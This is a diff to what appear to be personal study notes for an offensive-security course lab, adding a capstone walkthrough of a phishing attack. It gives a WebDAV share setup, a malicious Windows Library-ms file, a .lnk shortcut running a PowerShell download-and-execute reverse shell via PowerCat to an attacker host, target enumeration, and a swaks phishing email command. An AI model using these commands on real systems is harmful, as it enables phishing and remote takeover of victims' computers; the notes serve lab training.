@@ -1072,6 +1072,55 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   nc -nvlp 4444
   ```
   open the MyMacro doc.
+
+- 12.2.3 capstone lab email phish to send over windows libray files
+  - Install and start wsgidav for shared folder  
+    ```
+    pipx install wsgidav
+    mkdir /home/kali/webdav
+    /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+    ```
+  - Start PowerCat on port 8000  
+    `cd usr/…/server/data/module_source/management`  
+    `python3 -m http.server 8000`  
+  - nc -nvlp 4444  
+  - Remote to VM3 to draf windows library files: xfreerdp3 /u:offsec /p:lab /v:192.168.158.194
+  - Create New File config.Library-ms in visual studio core
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+	<name>@windows.storage.dll,-34582</name>
+	<version>6</version>
+	<isLibraryPinned>true</isLibraryPinned>
+	<iconReference>imageres.dll,-1003</iconReference>
+	<templateInfo>
+	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+	</templateInfo>
+	<searchConnectorDescriptionList>
+	<searchConnectorDescription>
+	<isDefaultSaveLocation>true</isDefaultSaveLocation>
+	<isSupported>false</isSupported>
+	<simpleLocation>
+	<url>http://<KALI></url> 
+	</simpleLocation>
+	</searchConnectorDescription>
+	</searchConnectorDescriptionList>
+	</libraryDescription>
+    ```
+  - Create .ink shortcut file and save as "automatic_configuration"  
+    `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 4444 -e powershell"`  
+  - Copy automatic_configuration.lnk, config.Library-ms to the "execute config" folder  
+  - Enumerate target web server  
+    ```
+    gobuster dir -u http://192.168.158.199/ -w /usr/share/wordlists/dirb/common.txt -x pdf
+    wget http://192.168.158.199/info.pdf
+    exiftool -a -u info.pdf
+    Author: Dave Wizard
+    ```
+  - Open PDF, get the email recipient and credentials (test@supermagicorg.com, test)
+  - email phishing attack (target IP)  
+    `sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.158.199 --body @body.txt --header "Subject: Problems" --suppress-data`
+  - netcat reverse shell received: `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue`
     
 ### Password Attacks  
 - 16.1.1 SSH and RDP
